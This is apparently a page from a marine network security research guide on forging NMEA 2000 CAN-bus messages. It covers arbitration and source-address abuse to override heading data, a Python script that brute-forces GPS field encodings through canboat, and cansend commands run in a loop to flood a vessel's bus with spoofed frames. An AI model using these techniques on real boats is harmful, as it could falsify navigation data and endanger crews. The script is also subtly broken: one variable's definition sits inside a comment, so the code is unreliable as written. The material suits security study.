---
description: The next step in controlling the network
---

# Spoofing Attacks

## What is a Spoofing Attack?

A data spoofing attack is a type of malicious action that involves creating data from scratch that is meant to look like authentic data from another source. Spoofing attacks differ from replay attacks because, unlike a replay attack where an attacker records data from a legitimate source, the data in a spoofing attack is created entirely by the attacker. For example, if an attacker uses an exposed API to find out how to authenticate to a remote server, then crafts and sends the necessary data string to log in, the attacker has executed a data spoofing attack.

## Spoofing Attacks on NMEA 2000

Many of the same vulnerabilities and design decisions that make NMEA 2000 networks vulnerable to replay attacks also make them vulnerable to spoofing attacks. However, there are other features of NMEA 2000 that can make spoofing attacks even more effective.

### Message Priority

In CAN-BUS networks, messages are send based on an arbitration system. This system allows multiple devices to use the same broadcast network at the same time. In order to arbitration to work correctly, devices on a CAN-BUS network must all agree to follow the same rules regarding arbitration... except for an attacker's. Spoofed data strings targeting a NMEA 2000 network can have their priority changed to "outrank" other messages on the network.

### Data Field Manipulation

In some instances, changing other parts of the data string during a spoofing attack can make an attacker's messages more important than the legitimate ones on the network. For example, on both the HackBoat and Shuman networks, sending a heading update with a higher source address will completely take precedence over a heading update from a lower source address. As previously mentioned, there is no access controls nor authentication regarding source and destination addresses, and an attacker can spoof heading data with a source address of 255 (highest possible) to always have priority on the network of the heading updates.

## Challenges to Spoofing attacks

While spoofing attacks offer all sorts of possibilities to change data in more specific ways than replay attacks, there are extra challenges with spoofing. Firstly, not all data strings and protocols are publicly available knowledge. That means in order to write custom data, an attacker has to reverse engineer the derivation of the data they want to send. Additionally, there can be higher level controls regarding authentication and integrity that are more likely to be met with a replay attack than a spoofing attack.

## Demonstration

{% embed url="https://canboat.github.io/canboat/canboat.xml#bitfield-enumerations" %}

Once you've found a data field that you're interested in spoofing we recommend reading the documentation linked above and seeing if it has been reverse engineered.  If so building off of their research will help speed up the process.  If not, you can use tools like python to rapidly create various binary and hex payloads that you can send into the canboat `analyzer` and read the output.

Example python binary brute forcing script using canboat to read the translated values:

```python
#!/usr/bin/python3
import os
longZero="00000000000000000000000000000000"
lat="000000000000000000000000000000000"
whole="00000000000000000000000000000000000000000000000000000000000000000"

os.system("echo > bounds.txt")

f=open("latcsv2.csv","w")

def increment_binary(s): #Take a number and add 1, then return the binary
    s='{:034b}'.format(1+int(s,2))
    # s=s+longZero
    return s
for i in range(60000): #Arbitrarily large number for data points
    lat = increment_binary(lat) #Go up by 1 every loop
    # print("ITERATION : " + str(i))
    binaryy=lat+ " : " 
    # print("BRINARY : " + binaryy)
    hexString="{:016x}".format(int(lat+longZero,2)) #Format string to keep length of binary consistant
    command2="echo \"echo '(1664564348.469461) can0 09F8016E#" + hexString + ",\" >> bounds.txt" #You may need to change the ARB_ID used to match your specific purposes.    command3="echo -n '" + binaryy + ",' >> bounds.txt"
    command="echo '(1664564348.469461) can0 09F8016E#" + hexString + "' | candump2analyzer|analyzer"
    command4="echo 'Decimal : " + str(i+1) + "' >> bounds.txt"
    os.system(command2)
    os.system(command3)
    command5=os.popen(command).read()
    print(command5)
    os.system(command4)
    os.system("echo "" >> bounds.txt")
    print(command5.split())
    latHuman=command5.split("=")[1]
    latHuman2=latHuman.split(";")[0]
    f.write(str(i+1)+","+hexString+","+latHuman2+"\n")
```



This script will automate checking the binary boundaires of GPS position updates sent by NMEA2000.  Then you can use this information and begin looking for things like how mant bits affect certain fields, whether or not they appear to be signed or unsigned integers, what the bounds of the output are, and anything else that may help you gain a better understanding of how to create your own can frame.

## Execution

Once you have a can frame that you'd like to send, meaning you have the correct Arbitaration ID and the desired data field, sending is quite simple.

```
cansend can0 <ARB_ID>#<DATA>
```

This will send a single frame from your plant device to the NMEA2000 network connected on `can0`, with the arbitration ID and data field specified.

Because information on the bus is constantly updating, often times its necesarry to constnatly send this message to try and drown out the legitimate messages also being sent on the bus.

To accomplish this a while loop in bash can be used.

```
while true; do cansend <ARB_ID>#<DATA>; done
```

This command will send your message as fast as the plant device can, until you exit out of the loop with `Cntrl+C`.



